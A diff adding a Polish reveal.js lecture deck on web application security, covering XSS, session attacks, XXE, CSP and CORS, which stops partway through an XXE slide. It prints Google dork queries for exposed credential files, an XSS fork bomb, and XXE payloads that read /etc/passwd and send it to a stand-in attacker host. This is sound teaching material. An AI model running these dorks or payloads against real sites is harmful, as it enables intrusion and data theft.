@@ -1,0 +1,3136 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<title>Bezpieczeństwo aplikacji webowych</title>
+<meta name="author" content="(Marcin Mela)"/>
+
+<link rel="stylesheet" href="file:////home/marcin/.emacs.d/libs/reveal.js/css/reveal.min.css"/>
+<link rel="stylesheet" href="file:////home/marcin/.emacs.d/libs/reveal.js/css/theme/solarized.css" id="theme"/>
+<link rel="stylesheet" href="reveal-local.css"/>
+<!-- If the query includes 'print-pdf', include the PDF print sheet -->
+<script>
+    if( window.location.search.match( /print-pdf/gi ) ) {
+        var link = document.createElement( 'link' );
+        link.rel = 'stylesheet';
+        link.type = 'text/css';
+        link.href = 'file:////home/marcin/.emacs.d/libs/reveal.js/css/print/pdf.css';
+        document.getElementsByTagName( 'head' )[0].appendChild( link );
+    }
+</script>
+</head>
+<body>
+<div class="reveal">
+<div class="slides">
+<section>
+<h1>Bezpieczeństwo aplikacji webowych</h1>
+<h2>Marcin Mela</h2>
+<h2><a href="mailto:"></a></h2>
+<h2></h2></section>
+<section>
+<h2>Table of Contents</h2><ul>
+<li>
+<a href="#sec-1">Wprowadzenie</a>
+</li>
+<li>
+<a href="#sec-2">Aspekt prawny</a>
+</li>
+<li>
+<a href="#sec-3">Architektura a bezpieczeństwo</a>
+</li>
+<li>
+<a href="#sec-4">Google hacking</a>
+</li>
+<li>
+<a href="#sec-5">Cross Site Scripting (XSS)</a>
+</li>
+<li>
+<a href="#sec-6">Ataki na sesje</a>
+</li>
+<li>
+<a href="#sec-7">Ataki związane z przetwarzaniem XML</a>
+</li>
+<li>
+<a href="#sec-8">SQL Injection</a>
+</li>
+<li>
+<a href="#sec-9">Pozostałe ataki</a>
+</li>
+<li>
+<a href="#sec-10">CAPTCHA</a>
+</li>
+<li>
+<a href="#sec-11">Linki, materiały</a>
+</li>
+</ul>
+</section>
+
+<section>
+<section id="sec-1" >
+
+<h2>Wprowadzenie</h2>
+</section>
+<section id="sec-1-1" >
+
+<h3>Słowo wstępu</h3>
+<blockquote>
+<p>
+"What do Linked In, Target, Yahoo, Sony and Adobe all have in common?
+</p>
+
+<p>
+They have all been hacked, releasing millions of pieces of personal
+information and costing at least as many dollars."
+</p>
+
+<p>
+&#x2013; Matthew Casperson ("Full Stack Developer")
+</p>
+</blockquote>
+</section>
+<section id="sec-1-2" >
+
+<h3>Złote myśli</h3>
+<blockquote>
+<p>
+Moja aplikacja jest bezpieczna.
+</p>
+</blockquote>
+
+<blockquote>
+<p>
+Po co ktoś chciałby włamywać się do mojej aplikacji?
+</p>
+</blockquote>
+
+<blockquote>
+<p>
+Aplikacje pisane w Javie są bezpieczniejsze niż od tych pisanych w PHP
+</p>
+</blockquote>
+
+<blockquote>
+<p>
+Zapewniliśmy bezpieczeństwo aplikacji wymuszając całą komunikację po HTTPS.
+</p>
+</blockquote>
+
+<blockquote>
+<p>
+Ten plik został zabezpieczony w tak zwanym głębokim ukryciu, jak to mówią informatycy.
+</p>
+</blockquote>
+</section>
+<section id="sec-1-3" >
+
+<h3>Typowa web-aplikacja</h3>
+<img src="./images/WebApplication.png" alt="WebApplication.png" align="center" height="500px" />
+</section>
+<section id="sec-1-4" >
+
+<h3>Przykładowe podatności - Spring Framework</h3>
+<dl class="org-dl">
+<dt><b>CVE-2014-1904</b></dt><dd>Cross-site scripting (XSS) vulnerability in
+web/servlet/tags/form/FormTag.java in Spring MVC in
+Spring Framework 3.0.0 before 3.2.8 and 4.0.0
+before 4.0.2 allows remote attackers to inject
+arbitrary web script or HTML via the requested URI
+in a default action.
+</dd>
+
+<dt><b>CVE-2013-6429</b></dt><dd>The SourceHttpMessageConverter in Spring MVC in
+Spring Framework before 3.2.5 and 4.0.0.M1 through
+4.0.0.RC1 does not disable external entity
+resolution, which allows remote attackers to read
+arbitrary files, cause a denial of service, and
+conduct CSRF attacks via crafted XML, aka an XML
+External Entity (XXE) issue, and a different
+vulnerability than CVE-2013-4152 and
+CVE-2013-7315. 
+</dd>
+</dl>
+</section>
+<section id="sec-1-5" >
+
+<h3>Przykładowe podatności - Serwery aplikacji</h3>
+<dl class="org-dl">
+<dt><b>Java Unserialize Vulnerability</b></dt><dd><ul class="org-ul">
+<li><a href="http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/">http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/</a>
+</li>
+<li><a href="http://www.slideshare.net/frohoff1/appseccali-2015-marshalling-pickles">http://www.slideshare.net/frohoff1/appseccali-2015-marshalling-pickles</a>
+</li>
+</ul>
+</dd>
+</dl>
+</section>
+<section id="sec-1-6" >
+
+<h3>Programiści</h3>
+<p>
+Programiści często korzystają z online-owych narzędzi jak:
+</p>
+<ul class="org-ul">
+<li>kodowanie URL, base64
+</li>
+<li>liczenie skrótów MD5, SHA1 itp
+</li>
+<li>formatowanie kodu
+</li>
+<li>walidacja xml
+</li>
+<li>udostępnianie/współpraca nad fragmentami kodu
+</li>
+</ul>
+
+<p>
+Nie mając żadnej informacji komu i gdzie przekazują te informacje. 
+</p>
+</section>
+</section>
+<section>
+<section id="sec-2" >
+
+<h2>Aspekt prawny</h2>
+<p>
+Zabawy w niezamówione testy bezpieczeństwa mogą mieć swoje (przykre)
+prawne następstwa.
+</p>
+
+<ul class="org-ul">
+<li><a href="http://prawo.vagla.pl/node/8154">http://prawo.vagla.pl/node/8154</a>
+</li>
+<li><a href="http://di.com.pl/precedensowy-wyrok-w-sprawie-sql-injection-23837">http://di.com.pl/precedensowy-wyrok-w-sprawie-sql-injection-23837</a>
+</li>
+<li><a href="http://www.proline.pl/?n=haker-kontra-multimedia-dane-zle-zabezpieczone">http://www.proline.pl/?n=haker-kontra-multimedia-dane-zle-zabezpieczone</a>
+</li>
+</ul>
+</section>
+</section>
+<section>
+<section id="sec-3" >
+
+<h2>Architektura a bezpieczeństwo</h2>
+</section>
+<section id="sec-3-1" >
+
+<h3>Monolith</h3>
+<img src="./images/Monolith.png" alt="Monolith.png" align="center" height="500px" />
+</section>
+<section id="sec-3-2" >
+
+<h3>Single Page Application</h3>
+<ul class="org-ul">
+<li>Kod frontend-u przejmuje części dotychczas typowe dla serwera:
+budowa widoków, nawigacja, a nawet local storage
+</li>
+<li>Architekura SPA przerzuca dużą cześć odpowiedzialności za
+bezpieczeństwo na klienta (przeglądarkę)
+</li>
+<li>Pojawia się pojęcie zarządzania sesją po stronie klienta - serwer
+dostarcza tylko czyste dane
+</li>
+<li>JS-owe frameworki MVC (np Angular) dostarczają mechanizmy pomagające
+zapobiegać niektórym atakom (XSS, CSRF)
+</li>
+<li>Logika front-endu jest całkowicie przeźroczysta
+</li>
+<li>Widoki, requesty, endpointy dla różnych ról są widoczne dla każdego
+użytkownika
+</li>
+<li>Serwer wciąż nie może ufać danym przychodzącym od klientów
+</li>
+</ul>
+</section>
+<section id="sec-3-3" >
+
+<h3>Microservices</h3>
+<blockquote>
+<p>
+The term "Microservice Architecture" has sprung up over the last few
+years to describe a particular way of designing software applications
+as suites of independently deployable services. 
+</p>
+
+<p>
+&#x2013; Martin Fowler
+</p>
+</blockquote>
+</section>
+<section id="sec-3-4" >
+
+<h3>Architektura mikroserwisów</h3>
+<img src="./images/Microservices.png" alt="Microservices.png" align="center" height="500px" />
+</section>
+<section id="sec-3-5" >
+
+<h3>Bezpieczeństwo mikroserwisów</h3>
+<p>
+Architektura mikro serwisów stawia nowe pytania w kwestii
+bezpieczeństwa:
+</p>
+<ul class="org-ul">
+<li>Czy poszczególne części systemu powinny być dostępne z zewnątrz?
+</li>
+<li>Jak jesteśmy zabezpieczeni przed niepowołanym dostępem, gdy
+atakujący przedostanie się "do środka"?
+</li>
+<li>Jaki może być zasięg strat jeśli atakujący dostanie się do dowolnego
+z serwisów?
+</li>
+<li>Jak rozwiązaliśmy kwestie wzajemnego zaufania pomiędzy serwisami?
+Czy mamy serwisy które ufają każdemu?
+</li>
+<li>W jaki sposób autoryzujemy requesty? Czy informacja o inicjatorze
+requestu jest przekazywana pomiędzy serwisami czy jest tracona na
+api gateway?
+</li>
+<li>Czy serwisy komunikują się ze sobą w bezpieczny sposób?
+</li>
+<li>Jaki jest poziom ryzyka dla poszczególnych serwisów? Czy były
+testowane pod kątem typowych podatności?
+</li>
+<li>Czy wdrożyliśmy typowe praktyki bezpieczeństwa, polityki haseł,
+upgrade-u komponentów?
+</li>
+</ul>
+</section>
+</section>
+<section>
+<section id="sec-4" >
+
+<h2>Google hacking</h2>
+</section>
+<section id="sec-4-1" >
+
+<h3>Wstęp</h3>
+<ul class="org-ul">
+<li>Wyszukiwarka Google indeksuje informacje udostępnione przez strony i
+aplikacje internetowe, często w sposób niezamierzony czy
+nieprzewidziany przez autorów
+</li>
+<li>Google udostępnia mechanizm zaawansowanego wyszukiwania i tzw
+"search operators", które można użyć by zbudować zapytanie
+</li>
+<li>Atakujący może użyć wyszukiwarki Google na kilka sposobów:
+<ul class="org-ul">
+<li>wybrać stronę ze względu na interesują go treść, podatność,
+rodzaj pliku
+</li>
+<li>wyszukać aplikacje działające na określonym serwerze, wersji
+frameworka czy używające konkretnej biblioteki
+</li>
+<li>dokładnie przeszukać jedna stronę, poznać słabe punkty, dowiedzieć
+się jak najwięcej o strukturze, zasobach, odnaleźć "ukryte" zasoby
+</li>
+<li>dotrzeć do danych których nasza strona już nie zawiera ale wciąż
+są w cache Google'a
+</li>
+</ul>
+</li>
+</ul>
+
+</section>
+<section>
+
+<ul class="org-ul">
+<li>Więcej informacji:
+<ul class="org-ul">
+<li><a href="http://niebezpiecznik.pl/edu/google_hacking.pdf">http://niebezpiecznik.pl/edu/google_hacking.pdf</a>
+</li>
+<li><a href="https://www.blackhat.com/presentations/bh-europe-05/BH_EU_05-Long.pdf">https://www.blackhat.com/presentations/bh-europe-05/BH_EU_05-Long.pdf</a>
+</li>
+</ul>
+</li>
+
+<li>Baza zapytań:
+<ul class="org-ul">
+<li><a href="https://www.exploit-db.com/google-hacking-database/">https://www.exploit-db.com/google-hacking-database/</a>
+</li>
+<li><a href="http://www.hackersforcharity.org/ghdb/">http://www.hackersforcharity.org/ghdb/</a>
+</li>
+</ul>
+</li>
+</ul>
+</section>
+<section id="sec-4-2" >
+
+<h3>Przykłady</h3>
+<ul class="org-ul">
+<li>intitle:index.of -inurl:index.php Metallica
+</li>
+<li>inurl:SELECT inurl:FROM inurl:WHERE
+</li>
+<li>filetype:bak site:www.example.com mysql warning
+</li>
+<li>filetype:bak inurl:"htaccess|passwd|shadow|htusers"
+</li>
+<li><a href="http://admin:*@www">http://admin:*@www</a> 
+</li>
+<li>filetype:bak inurl:include.php
+</li>
+<li>filetype:bak inurl:config.php
+</li>
+<li>filetype:log admin account info
+</li>
+</ul>
+
+</section>
+<section>
+
+<ul class="org-ul">
+<li>intitle:index.of -inurl:index.php zdjecia
+</li>
+<li>"Access denied for user"  "using password"  
+</li>
+<li>"The full stack trace of the root cause is available in the Apache Tomcat"
+</li>
+<li>filetype:bak mysql_connect
+</li>
+<li>intitle:"Index of" .mysql_history
+</li>
+<li>"web file browser" "use regular expression"
+</li>
+<li>intitle:phpMyAdmin "Welcome to phpMyAdmin" "running on * as root@"
+</li>
+<li>intitle:phpMyAdmin "Welcome to phpMyAdmin <b>*</b>" "running on * as *"
+</li>
+<li>intitle:Tomcat Status | inurl:/status?full=true
+</li>
+<li>inurl:jmx-console
+</li>
+</ul>
+</section>
+<section id="sec-4-3" >
+
+<h3>Przykłady: kamerki, drukarki, switche</h3>
+<ul class="org-ul">
+<li>inurl:”ViewerFrame?Mode=”
+</li>
+<li>inurl:indexFrame.shtml Axis
+</li>
+<li>inurl:view/indexFrame.shtml
+</li>
+<li>intitle:”live view” intitle:axis
+</li>
+<li>inurl:view/view.shtml
+</li>
+<li>inurl:hp/device/this
+</li>
+<li>"speedstream router management interface"
+</li>
+<li>"videoconference management system" ext:htm
+</li>
+</ul>
+</section>
+</section>
+<section>
+<section id="sec-5" >
+
+<h2>Cross Site Scripting (XSS)</h2>
+</section>
+<section id="sec-5-1" >
+
+<h3>Wprowadzenie</h3>
+<p>
+<b>XSS</b> to obecnie jeden z najpopularniejszych ataków. Uruchamiany jest
+zawsze w przeglądarce (kliencie) chociaż wstrzyknięcie złośliwego kodu
+może być po stronie serwera lub klienta.  
+</p>
+
+<p>
+Sprawnie użyty XSS pozwala:
+</p>
+<ul class="org-ul">
+<li>wykraść dane dostępowe do aplikacji
+</li>
+<li>wykraść identyfikatory sesji
+</li>
+<li>zmienić treści na stronie
+</li>
+<li>wykonać DoS
+</li>
+<li>zaatakować inne strony
+</li>
+<li>zbudować armię "zombie" z użytkowników zaatakowanej aplikacji
+</li>
+</ul>
+
+<p>
+Problemy z XSS mieli: MySpace, Facebook, Google, FBI, CIA i tysiące innych.
+</p>
+</section>
+<section id="sec-5-2" >
+
+<h3>XSS - rodzaje</h3>
+<p>
+Można wyróżnić 3 podstawowe rodzaje ataków XSS
+</p>
+<ul class="org-ul">
+<li>Reflected XSS (Non Persistent XSS)
+</li>
+<li>Stored XSS (Persistent XSS)
+</li>
+<li>DOM Based XSS
+</li>
+</ul>
+</section>
+<section id="sec-5-3" >
+
+<h3>Reflected XSS</h3>
+<p>
+Występuje gdy aplikacja (serwer) wykorzystuje dane bezpośrednio z
+parametrów. Atakujący podrzuca link osobie atakowanej (email, skype,
+alias), która po kliknięciu dostanie treść z wstrzykniętym kodem.
+</p>
+
+<p>
+Załóżmy, że wyszukiwarka na stronie jest podatna na XSS
+</p>
+<img src="./images/generated-reflectedxss-intro1.png" alt="generated-reflectedxss-intro1.png" align="center" />
+
+<img src="./images/generated-reflectedxss-intro2.png" alt="generated-reflectedxss-intro2.png" align="center" />
+
+<p>
+Można to wykorzystać do ataku:
+</p>
+<pre class="example">
+http://www.example.com/search.html?q=&lt;script&gt;alert('hacked')&lt;/script&gt;
+</pre>
+</section>
+<section id="sec-5-4" >
+
+<h3>Reflected XSS - scenariusz</h3>
+<img src="./images/generated-reflectedxss-scenario.png" alt="generated-reflectedxss-scenario.png" align="center" height="500px" />
+</section>
+<section id="sec-5-5" >
+
+<h3>Stored XSS</h3>
+<p>
+Mówimy o <b>Stored XSS</b> gdy złośliwie wstrzyknięty kod jest
+przechowywany i serwowany użytkownikom przez samą aplikację.
+</p>
+
+<p>
+Przykład: Atakujący użył formularza dodawania komentarzy by wstrzyknąć
+i zapisać swój kod, który potem zostanie wysłany do pozostałych
+użytkowników odwiedzających komentowany artykuł. 
+</p>
+</section>
+<section id="sec-5-6" >
+
+<h3>Stored XSS - scenariusz</h3>
+<img src="./images/generated-storedxss-scenario.png" alt="generated-storedxss-scenario.png" align="center" height="500px" />
+</section>
+<section id="sec-5-7" >
+
+<h3>DOM Based XSS</h3>
+<p>
+Ta odmiana XSS wykorzystuje podatności w kodzie po stronie klienta
+(przeglądarki) w odróżnieniu od Reflected XSS i Stored XSS które
+traktujemy jako problemy po stronie serwera.
+</p>
+
+<p>
+W swoim działaniu jest podobny do Reflected XSS z tą różnicą, że
+złośliwy kod nie jest przetwarzany przez serwer a jedynie odsyłany do
+przeglądarki (często nie jest wysyłany do serwera). Zapobieganie tym
+atakom odbywa się głównie w kodzie JavaScript.
+</p>
+</section>
+<section id="sec-5-8" >
+
+<h3>DOM Based XSS - scenariusz</h3>
+<img src="./images/generated-domxss-scenario.png" alt="generated-domxss-scenario.png" align="center" height="500px" />
+</section>
+<section id="sec-5-9" >
+
+<h3>XSS Fork Bomb</h3>
+<div class="org-src-container">
+
+<pre  class="src src-js">&lt;script&gt;
+<span style="color: #0000FF;">while</span> (<span style="color: #D0372D;">true</span>) {
+  <span style="color: #0000FF;">var</span> <span style="color: #BA36A5;">w</span> = window.open();
+  w.document.write(document.documentElement.outerHTML||document.documentElement.innerHTML);
+}
+&lt;/script&gt;
+</pre>
+</div>
+
+<div class="org-src-container">
+
+<pre  class="src src-js">&lt;a href=<span style="color: #008000;">"#"</span> onload=<span style="color: #008000;">"function() { while (true) { var w = window.open(); w.document.write(document.documentElement.outerHTML||document.documentElement.innerHTML); } }"</span>&gt;XSS fork bomb&lt;/a&gt;
+</pre>
+</div>
+</section>
+<section id="sec-5-10" >
+
+<h3>XSS Shell</h3>
+<p>
+Przejęcie komputera za pomocą XSS-a?
+</p>
+
+<ul class="org-ul">
+<li>Instalujemy XSS Shell na naszym serwerze
+(<a href="https://github.com/portcullislabs/xssshell-xsstunnell">https://github.com/portcullislabs/xssshell-xsstunnell</a>)
+</li>
+<li>Wstrzykujemy skrypt inicjujący XSS Shell na atakowanej stronie
+</li>
+<li>Czekamy kiedy ofiary pojawią się online i wykonujemy akcje: 
+<ul class="org-ul">
+<li>Pokaż alert
+</li>
+<li>Pokaż cookie
+</li>
+<li>Keylogger
+</li>
+<li>Zawartość schowka (IE)
+</li>
+</ul>
+</li>
+</ul>
+</section>
+<section id="sec-5-11" >
+
+<h3>XSS - zapobieganie</h3>
+<ul class="org-ul">
+<li>Filtry HTTP które blokują przetwarzanie requestów zawierających
+potencjalne wstrzyknięcia
+</li>
+<li>Escape-owanie znaków html ( "&lt;" na &amp;lt; itd) - <code>ESAPI.encoder()</code>
+</li>
+<li>Parsery/filtry/sanitizer-y(?) HTML które potrafią przepuścić wybrane
+zakres znaczników i ich atrybutów
+<ul class="org-ul">
+<li><a href="https://github.com/owasp/java-html-sanitizer">https://github.com/owasp/java-html-sanitizer</a>
+</li>
+<li><a href="https://github.com/finn-no/xss-html-filter">https://github.com/finn-no/xss-html-filter</a>
+</li>
+<li><a href="https://github.com/Vereyon/HtmlRuleSanitizer">https://github.com/Vereyon/HtmlRuleSanitizer</a>
+</li>
+</ul>
+</li>
+<li>Używać mechanizmy template-ów które oferują funkcje auto-escape-owania
+</li>
+</ul>
+</section>
+<section id="sec-5-12" >
+
+<h3>XSS - HTML sanitizer</h3>
+<p>
+Przykład użycia OWASP HTML Sanitizer:
+</p>
+
+<div class="org-src-container">
+
+<pre  class="src src-java"><span style="color: #6434A3;">PolicyFactory</span> <span style="color: #BA36A5;">policy</span> = <span style="color: #0000FF;">new</span> <span style="color: #6434A3;">HtmlPolicyBuilder</span>()
+    .allowElements(<span style="color: #008000;">"a"</span>)
+    .allowUrlProtocols(<span style="color: #008000;">"https"</span>)
+    .allowAttributes(<span style="color: #008000;">"href"</span>).onElements(<span style="color: #008000;">"a"</span>)
+    .requireRelNofollowOnLinks()
+    .build();
+<span style="color: #6434A3;">String</span> <span style="color: #BA36A5;">safeHTML</span> = policy.sanitize(untrustedHTML);
+</pre>
+</div>
+</section>
+<section id="sec-5-13" >
+
+<h3>XSS - Session cookie</h3>
+<p>
+Dla cookie reprezentującego ID sesji warto ustawić opcję <code>httpOnly</code> na
+<code>true</code> by przeglądarka zablokowała skryptom dostęp do jego wartości:
+</p>
+
+<div class="org-src-container">
+
+<pre  class="src src-java"><span style="color: #6434A3;">Cookie</span> <span style="color: #BA36A5;">cookie</span> = getMyCookie(<span style="color: #008000;">"myCookieName"</span>);
+cookie.setHttpOnly(<span style="color: #D0372D;">true</span>);
+</pre>
+</div>
+
+<div class="org-src-container">
+
+<pre  class="src src-xml"><span style="color: #8D8D84; font-style: italic;">&lt;!--</span><span style="color: #8D8D84; font-style: italic;">Since JEE6, we can use web.xml to secure session cookies </span><span style="color: #8D8D84; font-style: italic;">--&gt;</span>
+&lt;<span style="color: #000088; background-color: #DEDEDE;">session-config</span>&gt;
+ &lt;<span style="color: #000088; background-color: #DEDEDE;">cookie-config</span>&gt;
+  &lt;<span style="color: #000088; background-color: #DEDEDE;">http-only</span>&gt;true&lt;/<span style="color: #000088; background-color: #DEDEDE;">http-only</span>&gt;
+ &lt;/<span style="color: #000088; background-color: #DEDEDE;">cookie-config</span>&gt;
+&lt;/<span style="color: #000088; background-color: #DEDEDE;">session-config</span>&gt;
+</pre>
+</div>
+</section>
+<section id="sec-5-14" >
+
+<h3>Content Security Policy</h3>
+<ul class="org-ul">
+<li>Nowy standard pozwalający zdefiniować dozwolone pochodzenie zasobów
+(JS, CSS, obrazki, pluginy, fonty) w aplikacji webowej
+</li>
+<li>Mechanizm przeglądarki stworzony jako obrona przed XSS
+</li>
+<li>Pozwala ograniczyć dozwolone destynacje dla requestów, websocketów
+czy formularzy
+</li>
+<li>Daje możliwoś zablokowania niechcianych elementów jak obiekty Flash
+czy ramki
+</li>
+<li>Blokuje skrypty "inline" czy <code>eval()</code>
+</li>
+<li>Powoli wspierany przez frameworki MVC (AngularJS, Ember.js) które
+mają wbudowane tryby zgodności
+</li>
+<li>Działa w Chrome, Firefox, Safari i częściowo w IE10
+(<code>X-Content-Security-Policy</code>). Warto sprawdzić wsparcie w różnych
+przeglądarkach (<a href="http://caniuse.com/#search=CSP">http://caniuse.com/#search=CSP</a>)
+</li>
+</ul>
+
+</section>
+<section>
+
+<ul class="org-ul">
+<li>Opiera się na nagłówkach odpowiedzi HTTP ustawianych przez serwer
+</li>
+<li>Zasada działania to w skrócie: "blokuj wszystko, oprócz podanych
+wyjątków"
+</li>
+</ul>
+
+<pre class="example">
+Content-Security-Policy: script-src 'self' https://apis.google.com
+</pre>
+
+<ul class="org-ul">
+<li>Oferuje mechanizm raportów powiadamiający o naruszeniach polityki
+bezpieczeństwa
+</li>
+</ul>
+<pre class="example">
+Content-Security-Policy: default-src 'self';  https://apis.google.com; report-uri /reportsConsumer;
+{
+  "csp-report": {
+    "document-uri": "http://mypage.org/index.html",
+    "referrer": "http://badguy.com/",
+    "blocked-uri": "http://badguy.com/malicious.js",
+    "violated-directive": "script-src 'self' https://apis.google.com",
+    "original-policy": "script-src 'self' https://apis.google.com; report-uri http://mypage.org/reportsConsumer"
+  }
+}
+</pre>
+
+</section>
+<section>
+
+<ul class="org-ul">
+<li>Istnieje "łagodniejsza" odmiana mechanizmu CSP - która tylko
+raportuje nadużycia, ale ich nie blokuje
+</li>
+</ul>
+<pre class="example">
+Content-Security-Policy-Report-Only: default-src 'self'; https://apis.google.com; report-uri /reportsConsumer;
+</pre>
+
+</section>
+<section>
+
+<ul class="org-ul">
+<li>Aktywnie rozwijany:
+<dl class="org-dl">
+<dt><b>1.0</b></dt><dd>2015-02-19 - <a href="https://www.w3.org/TR/2015/NOTE-CSP1-20150219/">https://www.w3.org/TR/2015/NOTE-CSP1-20150219/</a>
+</dd>
+<dt><b>2.0</b></dt><dd>2015-07-21 - <a href="https://www.w3.org/TR/CSP2/">https://www.w3.org/TR/CSP2/</a> (obecnie
+rekomendowana)
+</dd>
+<dt><b>3.0 (draft)</b></dt><dd><a href="https://w3c.github.io/webappsec-csp/">https://w3c.github.io/webappsec-csp/</a>
+</dd>
+</dl>
+</li>
+</ul>
+</section>
+<section id="sec-5-15" >
+
+<h3>Cross-Origin Resource Sharing</h3>
+<blockquote>
+<p>
+Cross-origin resource sharing (w skrócie CORS) – mechanizm
+umożliwiający współdzielenie zasobów pomiędzy serwerami znajdującymi
+się w różnych domenach. Ściślej rzecz biorąc chodzi o możliwość
+wykonywania żądań AJAX między takimi serwerami przy zachowaniu pewnych
+ograniczeń co do dopuszczalnego źródła żądania.
+</p>
+
+<p>
+&#x2013; <a href="https://pl.wikipedia.org/wiki/Cross-Origin_Resource_Sharing">https://pl.wikipedia.org/wiki/Cross-Origin_Resource_Sharing</a>
+</p>
+</blockquote>
+</section>
+<section id="sec-5-16" >
+
+<h3>CORS</h3>
+<ul class="org-ul">
+<li>standard W3C
+</li>
+<li>oparty o nagłówki HTTP
+</li>
+<li>rozszerza standardowe podejście <b>same origin</b> jednocześnie
+zapewniając niezbędny poziom bezpieczeństwa
+</li>
+<li>definiuje sposób w jaki przeglądarka i serwer dogadują się w kwestii
+wykonania requestów <b>cross origin</b>
+</li>
+<li>wspierany przez praktycznie wszystkie współczesne przeglądarki
+</li>
+</ul>
+</section>
+<section id="sec-5-17" >
+
+<h3>CORS - scenariusz 1</h3>
+<img src="./images/generated-cors1-scenario.png" alt="generated-cors1-scenario.png" align="center" height="500px" />
+</section>
+<section id="sec-5-18" >
+
+<h3>CORS - scenariusz 2</h3>
+<img src="./images/generated-cors2-scenario.png" alt="generated-cors2-scenario.png" align="center" height="500px" />
+</section>
+</section>
+<section>
+<section id="sec-6" >
+
+<h2>Ataki na sesje</h2>
+</section>
+<section id="sec-6-1" >
+
+<h3>Session Prediction</h3>
+<p>
+Atak polegający na przewidywaniu identyfikatora sesji jaki wygenerował
+lub wygeneruje serwer. Podatne mogę być własne implementacje
+zarządzania sesją w tym mechanizm trwałej sesji (persistent session,
+"remember me").
+</p>
+
+<p>
+Wszędzie tam gdzie identyfikator jest generowany na podstawie danych,
+jest zbyt mało losowy lub za krótki, może pojawić się podatność na
+tego typu atak.
+</p>
+
+<p>
+Poniższe identyfikatory nie gwarantują bezpieczeństwa sesji:
+</p>
+<pre class="example">
+Cookie: JSESSIONID=marcin
+Cookie: JSESSIONID=10225362
+Cookie: JSESSIONID=sw2r1
+Cookie: JSESSIONID=bWFyY2luLTE0NDg3OTcyMzE%3D
+Cookie: JSESSIONID=202cb962ac59075b964b07152d234b70
+</pre>
+</section>
+<section id="sec-6-2" >
+
+<h3>Session Hijacking</h3>
+<p>
+Atak ten polega na użyciu identyfikatora sesji który został prawidłowo
+wygenerowany dla innego użytkownika. Istnieje kilka realizacji tego
+ataku:
+</p>
+<ul class="org-ul">
+<li>Cross Site Scripting
+</li>
+<li>Podsłuchiwanie ruchu sieciowego
+</li>
+<li>Man in the middle (np fałszywy Access Point)
+</li>
+<li>Man in the browser (Trojany dla przeglądarek)
+</li>
+</ul>
+</section>
+<section id="sec-6-3" >
+
+<h3>Session Fixation</h3>
+<p>
+<b>Session Fixation</b> to wykorzystanie podatności mechanizmu zarządzania
+sesjami, który nie zmienia identyfikatora sesji przy rozpoczęciu nowej
+sesji (np. po prawidłowym logowaniu się do systemu) a korzysta z już
+istniejącego.
+</p>
+
+<p>
+Atak ten można przeprowadzić na kilka sposób:
+</p>
+<ul class="org-ul">
+<li>podsyłając link z identyfikatorem sesji jako parametr url
+</li>
+<li>użyć XSS by ustawić wartość session-cookie
+</li>
+<li>dodając nagłówki przy atakach MITM czy MITB
+</li>
+</ul>
+</section>
+<section id="sec-6-4" >
+
+<h3>Session Fixation - scenariusz</h3>
+<img src="./images/generated-session-fixation-scenario.png" alt="generated-session-fixation-scenario.png" align="center" height="500px" />
+</section>
+</section>
+<section>
+<section id="sec-7" >
+
+<h2>Ataki związane z przetwarzaniem XML</h2>
+</section>
+<section id="sec-7-1" >
+
+<h3>XML External Entity (XXE)</h3>
+<p>
+Atak <b>XML XXE</b> to atak ukierunkowany na parsery XML które
+przetwarzając dokument akceptują nawiązania do zewnętrznych elementów
+w DTD (domyślna konfiguracja wielu parserów).
+</p>
+
+<div class="org-src-container">
+
+<pre  class="src src-xml">&lt;?<span style="color: #0000FF;">xml</span> <span style="color: #BA36A5;">version</span>=<span style="color: #008000;">"</span><span style="color: #008000;">1.0</span><span style="color: #008000;">"</span> <span style="color: #BA36A5;">encoding</span>=<span style="color: #008000;">"</span><span style="color: #008000;">ISO-8859-1</span><span style="color: #008000;">"</span>?&gt;
+&lt;!<span style="color: #0000FF;">DOCTYPE</span> foo [  
+   &lt;!<span style="color: #0000FF;">ELEMENT</span> foo <span style="color: #0000FF;">ANY</span> &gt;
+   &lt;!<span style="color: #0000FF;">ENTITY</span> xxe <span style="color: #0000FF;">SYSTEM</span> <span style="color: #036A07;">"</span><span style="color: #036A07;">file:///etc/passwd</span><span style="color: #036A07;">"</span> &gt;]&gt;
+
+&lt;<span style="color: #000088; background-color: #DEDEDE;">foo</span>&gt;<span style="color: #D0372D;">&amp;</span><span style="color: #D0372D;">xxe</span><span style="color: #D0372D;">;</span>&lt;/<span style="color: #000088; background-color: #DEDEDE;">foo</span>&gt;
+</pre>
+</div>
+</section>
+<section id="sec-7-2" >
+
+<h3>XML XEE - wykorzystanie</h3>
+<ul class="org-ul">
+<li>czytanie plików na dysku serwera
+</li>
+<li>przejście przez firewall i dostęp do wewnętrznych zasobów (atak na
+intranet)
+</li>
+<li>atak na zewnętrzny serwer
+</li>
+<li>atak DOS:
+<ul class="org-ul">
+<li>duży plik na innym serwerze
+</li>
+<li><code>/dev/urandom/</code>
+</li>
+<li>rekurencyjna definicja elementów
+</li>
+</ul>
+</li>
+</ul>
+</section>
+<section id="sec-7-3" >
+
+<h3>XML XEE - Przesłanie danych</h3>
+<p>
+Wysłany dokument: 
+</p>
+<div class="org-src-container">
+
+<pre  class="src src-xml">&lt;!<span style="color: #0000FF;">ELEMENT</span> foo <span style="color: #0000FF;">ANY</span> &gt;
+&lt;!<span style="color: #0000FF;">ENTITY</span> % file <span style="color: #0000FF;">SYSTEM</span> <span style="color: #036A07;">"</span><span style="color: #036A07;">file:///etc/passwd</span><span style="color: #036A07;">"</span>&gt;
+&lt;!<span style="color: #0000FF;">ENTITY</span> % dtd <span style="color: #0000FF;">SYSTEM</span> <span style="color: #036A07;">"</span><span style="color: #036A07;">http://abcd.dns.attackers.com/file.dtd</span><span style="color: #036A07;">"</span>&gt;
+%dtd;]&gt;
+</pre>
+</div>
+
+<p>
+Dokument <code>file.dtd</code> na zdalnym serwerze:
+</p>
+<div class="org-src-container">
+
+<pre  class="src src-xml"><span style="color: #8D8D84; font-style: italic;">&lt;!--</span><span style="color: #8D8D84; font-style: italic;">?xml version="1.0" encoding="ISO-8859-1"?</span><span style="color: #8D8D84; font-style: italic;">--&gt;</span>
